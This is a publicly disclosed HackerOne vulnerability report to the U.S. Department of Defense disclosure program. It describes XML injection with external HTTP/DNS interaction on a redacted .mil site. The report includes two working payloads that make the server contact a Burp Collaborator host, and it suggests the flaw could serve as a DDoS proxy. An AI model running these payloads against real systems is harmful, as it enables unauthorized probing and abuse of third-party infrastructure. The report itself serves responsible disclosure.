---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/xml-injection
  - env/network
substate: "resolved"
weakness: "XML Injection"
enriched: true
body: true
date: 2021-06-15
submitted: 2021-04-05T20:56:26.655Z
bounty_usd: null
votes: 13
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "fiveguyslover"
source: "https://hackerone.com/reports/1150799"
title: "XML Injection / External Service Interaction (HTTP/DNS) On https://█████████.mil"
---
# XML Injection / External Service Interaction (HTTP/DNS) On https://█████████.mil

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 13 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2021-06-15

- Report: [https://hackerone.com/reports/1150799](https://hackerone.com/reports/1150799)
- CWE: XML Injection
- Submitted: 2021-04-05T20:56:26.655Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Greetings, I found on one of your sites an XML Injection + External service Interaction (DNS/HTTP)
Link of the vulnerable file : https://█████.mil/██████████
Payload XML Injection : 
```
<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
```
(please change the link of burp collaborator and + URL encode the payload)

#How to reproduce

█████
(I cut the video because the reception time is 30-40 seconds, it is not very relevant)

here is another payload that works, without XML : 

```
http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
```
(please change the link of burp collaborator)
it is also necessary to wait a little, possibly one minute.

all the ips I receive are from ███.

if you need help, don't hesitate.
fiveguyslover.

## Impact

XML Injection + We can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Link of the vulnerable file : https://██████.mil/█████████

Payload XML Injection : 
```
<fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
```
(please change the link of burp collaborator and + URL encode the payload)

here is another payload that works, without XML : 

```
http://hzk9we4fcukbidprbvxdhw5iv914pudl0bo0.burpcollaborator.net/?setWarningMsg
```

POC Attached

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2021-04-05** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2021-04-29** @agent-bk1: Based on this report and report 1146600 you are being considered for Researcher of the Month. If you're selected, is there a name you'd like us to use or a twitter handle you'd like us to include?
- **2021-04-30** @fiveguyslover: Hello, can you use fiveguyslover?
i dont twitter though ..
here is my instagram: https://instagram.com/keeplove1337

Thank you !
- **2021-04-30** @fiveguyslover: Sorry but I wanted to know, do we win a prize when we are researcher of the month? A t-shirt for example or a badge?
- **2021-04-30** @agent-l8: Hey @fiveguyslover at this time no- the only prize is that as a Researcher of the month you are automatically entered into running for researcher of the year (which does include a swag pack). Thanks!
- **2021-04-30** @fiveguyslover: When can I see this?
(Researcher of the month)
- **2021-04-30** @agent-l8: It will be posted no later than the 15th of May, but usually early next week. Here is an example of the last researcher of the year: https://twitter.com/DC3VDP/status/1374010077183668227
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
